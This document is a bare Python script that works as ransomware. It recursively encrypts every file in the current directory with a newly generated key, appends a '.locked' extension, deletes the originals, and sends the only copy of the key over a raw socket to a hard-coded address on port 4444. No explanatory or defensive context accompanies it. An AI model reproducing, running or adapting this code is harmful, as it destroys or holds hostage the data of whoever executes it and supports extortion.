
import os
import socket
from cryptography.fernet import Fernet

def encrypt_files(path, key, new_extension=".locked"):
    fernet = Fernet(key)
    for root, _, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath.endswith(new_extension):
                continue
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(filepath + new_extension, 'wb') as f:
                f.write(encrypted_data)
            os.remove(filepath)

def main():
    key = Fernet.generate_key()
    encrypt_files('.', key)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.15.47', 4444))
    s.sendall(key)
    s.close()

if __name__ == "__main__":
    main()
